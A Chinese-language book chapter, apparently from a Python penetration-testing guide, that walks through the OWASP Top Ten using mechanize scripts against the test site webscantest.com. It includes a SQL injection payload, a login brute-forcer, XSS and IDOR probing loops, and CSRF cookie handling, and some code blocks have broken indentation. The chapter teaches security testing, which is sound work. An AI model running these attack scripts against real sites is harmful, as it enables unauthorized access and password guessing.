# 第四章：使用 Python 进行攻击脚本编写

**开放式 Web 应用安全项目**（**OWASP**）十大是对最严重的网络应用安全风险的列表。在本章中，我们将讨论如何使用 Python 库编写 OWASP 十大攻击脚本：

+   注入

+   破坏的身份验证

+   跨站脚本（XSS）

+   不安全的直接对象引用

+   安全配置错误

+   敏感数据暴露

+   缺少功能级访问控制

+   CSRF 攻击

+   使用已知漏洞的组件

+   未经验证的重定向和转发

# 注入

SQL 注入是攻击者可能创建或更改 SQL 命令以披露数据库中的数据的方法。这对于接受用户输入并将其与静态参数结合以构建 SQL 查询而没有适当验证的应用程序非常有效。

同样，所有类型的注入攻击都可以通过操纵应用程序的输入数据来完成。使用 Python，我们可以向应用程序注入一些攻击向量，并分析输出以验证攻击的可能性。Mechanize 是一个非常有用的 Python 模块，用于浏览网页表单，它提供了一个具有状态的编程式网络浏览体验。

我们可以使用`mechanize`来提交表单并分析响应：

```py
import mechanize 
 # Import module 

# Set the URL 
url = "http://www.webscantest.com/datastore/search_by_id.php" 

request = mechanize.Browser() 

request.open(url) 

# Selected the first form in the page 
request.select_form(nr=0) 

# Set the Id  
request["id"] = "1 OR 1=1" 

# Submit the form 
response = request.submit() 

content = response.read() 

print content 

```

这将打印出 POST 请求的响应。在这里，我们提交一个攻击向量来破坏 SQL 查询，并打印表中所有数据而不是一行。在测试网站时，我们必须创建许多类似的自定义脚本来测试许多类似的攻击向量。

因此，让我们重写脚本，从文件中获取所有攻击向量，然后逐个发送到服务器，并将输出保存到文件中：

```py
import mechanize 

# Set the URL 
url = "http://www.webscantest.com/datastore/search_by_id.php" 

browser = mechanize.Browser() 

attackNumber = 1 

# Read attack vectors 
with open('attack-vector.txt') as f: 

    # Send request with each attack vector 
    for line in f: 

         browser.open(url) 

   browser.select_form(nr=0) 

         browser["id"] = line 

         res = browser.submit() 

   content = res.read() 

      # write the response to file 
   output = open('response/'+str(attackNumber)+'.txt', 'w') 

   output.write(content) 

   output.close() 

   print attackNumber 

   attackNumber += 1 

```

我们可以检查请求的响应并识别可能的攻击。例如，前面的代码示例将提供包含句子“您的 SQL 语法有错误”的响应。从中，我们可以确定这种形式可能容易受到 SQL 注入攻击。之后，我们可以排除包含错误的响应，因为它们不会包含所需的数据。

此外，我们可以编写自定义脚本来注入 LDAP、XPath 或 NoSQL 查询、操作系统命令、XML 解析器和所有其他注入向量。

# 破坏的身份验证

当用于对应用程序进行用户身份验证的身份验证功能实施不正确时，可能会允许黑客破解密码或会话 ID，或利用其他用户的凭据来利用其他实施缺陷。这些类型的缺陷被称为破坏的身份验证。

我们可以使用机械化脚本来检查应用程序中的身份验证机制。

因此，我们必须检查账户管理功能，如账户创建、更改密码和找回密码。我们还可以编写定制的暴力和字典攻击脚本，以检查应用程序的登录机制。

我们可以生成包含一系列字符的所有可能密码，如下所示：

```py
# import required modules
from itertools import combinations  

from string import ascii_lowercase 

# Possible password list 

passwords = (p for p in combinations(ascii_lowercase,8)) 

for p in passwords: 

    print ''.join(p) 

```

稍后，我们可以使用这些密码进行暴力攻击，方法如下：

```py
import mechanize 

from itertools import combinations  

from string import ascii_lowercase 

url = "http://www.webscantest.com/login.php" 

browser = mechanize.Browser() 

attackNumber = 1 

# Possible password list 

passwords = (p for p in combinations(ascii_lowercase,8)) 

for p in passwords: 

    browser.open(url) 

    browser.select_form(nr=0) 

    browser["login"] = 'testuser' 

    browser["passwd"] = ''.join(p) 

    res = browser.submit() 

    content = res.read() 

    # Print  response code 

    print res.code 

     # Write response to file 

    output = open('response/'+str(attackNumber)+'.txt', 'w') 

    output.write(content) 

    output.close() 

    attackNumber += 1 

```

在这里，我们可以分析响应并确认登录。为此，我们必须搜索错误消息的响应。如果在响应中找不到错误消息，那么登录将成功。

在上面的例子中，我们可以检查是否被带回登录页面。如果我们被带回登录页面，登录失败：

```py
    # check if we were taken back to the login page or not 

    if content.find('<input type="password" name="passwd" />') > 0: 

         print "Login failed" 

```

我们还可以修改此脚本以暴力破解可预测或不太随机的会话 cookie。为此，我们必须分析身份验证 cookie 的模式。我们还可以用字典中的单词替换密码。代码将与我们为注入所做的相同，攻击向量将被字典文件中提供的单词替换。

# 跨站脚本（XSS）

跨站脚本也是一种注入攻击类型，当攻击者注入恶意攻击向量以浏览器端脚本的形式时发生。这是在 Web 应用程序使用用户的输入来构建输出而不进行验证或编码时发生的。

我们可以修改用于注入 SQL 攻击向量的脚本以测试 XSS 注入。为了验证输出响应，我们可以在响应中搜索预期的脚本：

```py
import mechanize 

url = "http://www.webscantest.com/crosstraining/aboutyou.php" 

browser = mechanize.Browser() 

attackNumber = 1 

with open('XSS-vectors.txt') as f: 

    for line in f: 

         browser.open(url) 

         browser.select_form(nr=0) 

         browser["fname"] = line 

         res = browser.submit() 

         content = res.read() 

         # check the attack vector is printed in the response. 
         if content.find(line) > 0: 

               print "Possible XXS" 

   output = open('response/'+str(attackNumber)+'.txt', 'w') 

   output.write(content) 

   output.close() 

   print attackNumber 

   attackNumber += 1 

```

XSS 发生在用户输入未经验证地打印到响应中。因此，为了检查 XSS 攻击的可能性，我们可以检查响应文本中我们提供的攻击向量。如果攻击向量在响应中出现而没有任何转义或验证，那么就有很高的可能性发生 XSS 攻击。

# 不安全的直接对象引用

当应用程序使用实际的引用标识符（ID）、名称或键来创建网页或 URL 时，且应用程序不验证用户访问请求页面的真实性时，就会发生这种漏洞。攻击者可能会更改 URL 中的参数以检测此类漏洞。

在应用程序中，用户的数据对另一个用户是不可访问的。检查以下脚本示例；它将遍历用户并检查数据是否对已登录用户可见：

```py
import mechanize 

url = "http://www.webscantest.com/business/access.php?serviceid=" 

attackNumber = 1 

for i in range(5): 

    res = mechanize.urlopen(url+str(i)) 

    content = res.read() 

    #  check if the content is accessible 

    if content.find("You service") > 0: 

         print "Possible Direct Object Reference" 

    output = open('response/'+str(attackNumber)+'.txt', 'w') 

    output.write(content) 

    output.close() 

    print attackNumber 

    attackNumber += 1 

```

# 安全配置错误

为了更安全的应用程序，需要对其所有基础技术进行安全配置，如应用程序、Web 服务器、数据库服务器和操作系统。此外，我们需要保持所有软件保持最新。一些安全配置错误的示例如下：

+   过时的软件

+   服务器中存在示例应用程序或示例数据库

+   启用导致数据泄露的目录列表，包括代码库

+   未处理的错误页面，可能会泄露敏感信息

+   适用或适用框架中的默认密码

+   我们可以使用 Python 脚本来验证这些类型的漏洞。正如我们在前面的章节中讨论的那样，我们可以使用 Python 库发送精心制作的请求并分析它们的响应。

# 敏感数据暴露

我们可以编写定制的 Python 脚本来检查网页中可能的数据暴露。例如，我们在上一章中讨论了电子邮件收集脚本，也可以用来检查网页中是否有任何暴露的电子邮件 ID。

为此，我们必须编写一个脚本来检查我们正在寻找的模式的 HTTP 响应。敏感数据可能会根据网站及其用途而有所不同。但我们可以检查敏感信息的暴露，如信用卡、银行详细信息、个人身份识别号码等。

# 缺少功能级访问控制

Web 应用程序在向用户提供特定功能的访问权限之前会验证用户的功能级访问权限。这些访问控制检查也需要在服务器端进行验证。如果服务器端缺少这些类型的访问检查，攻击者可以在没有任何授权的情况下进入应用程序。为了检查这种类型的漏洞，我们可以创建自定义脚本来验证应用程序的低权限用户，并尝试访问受限页面。我们可以确保所有受限页面对于任何低权限用户都是不可访问的。

# CSRF 攻击

**跨站请求伪造**（**CSRF**）攻击欺骗受害者的浏览器在受害者登录时向易受攻击的应用程序发送操纵的请求。因此，应用程序应确保请求是合法的。

由于 CSRF 攻击是针对已登录用户的攻击，我们必须在请求中发送会话 cookie。我们可以使用`cookielib`在会话之间记住 cookie：

```py
import mechanize 

cookies = mechanize.CookieJar() 

cookie_opener = mechanize.build_opener(mechanize.HTTPCookieProcessor(cookies)) 
mechanize.install_opener(cookie_opener)  

url = "http://www.webscantest.com/crosstraining/aboutyou.php" 

res = mechanize.urlopen(url) 

content = res.read()    

```

要测试 CSRF，我们必须从实际页面以外的页面提交表单。我们还可以检查 CSRF 令牌。如果表单中存在这样的令牌，操纵值并确保表单在错误的 CSRF 令牌下失败，并在每个请求上生成一个新的令牌。

# 使用已知漏洞的组件

当我们在应用程序中使用类似库、框架等组件时，如果没有进行适当的验证，就会出现这种类型的漏洞。这些组件可能始终在应用程序中以完全特权执行。因此，当应用程序中使用了一个有漏洞的组件时，这会让攻击者的工作变得更容易。我们可以编写一个 Python 脚本来检查应用程序中使用的组件的版本，并与**开放源漏洞数据库**（**OSVDB**）进行验证，查看是否存在未修补的已知漏洞。

OSVDB 列出了几乎所有已知的库和框架漏洞。因此，我们必须确保我们使用的是最新的组件，并且已经应用了最新的补丁。

# 未经验证的重定向和转发

Web 应用程序经常将用户重定向到其他页面或外部网站。我们必须验证这些重定向页面和网站的可信度。如果重定向目标作为应用程序的参数传递，攻击者可以将用户引导到任何钓鱼或注入恶意软件的网页。我们可以编写一个 Python 脚本来验证应用程序中的所有外部链接。为了验证可信度，我们可以依赖于像 Google 安全浏览检查器或 McAfee 网站顾问这样的第三方服务。

### 提示

Google 安全浏览检查器可以在这里找到：[`www.google.com/transparencyreport/safebrowsing/diagnostic/index.html`](https://www.google.com/transparencyreport/safebrowsing/diagnostic/index.html)，而 McAfee 网站顾问可以在这里找到：[`www.siteadvisor.com/sites/`](http://www.siteadvisor.com/sites/)。

# 总结

我们已经讨论了攻击脚本的基本可能性。现在你可以根据自己的需求创建自定义脚本。在本章中，我们使用了 mechanize 进行脚本编写。我们也可以使用前几章讨论过的任何其他模块来满足需求。在下一章中，我们将更多地讨论模糊测试和暴力攻击。
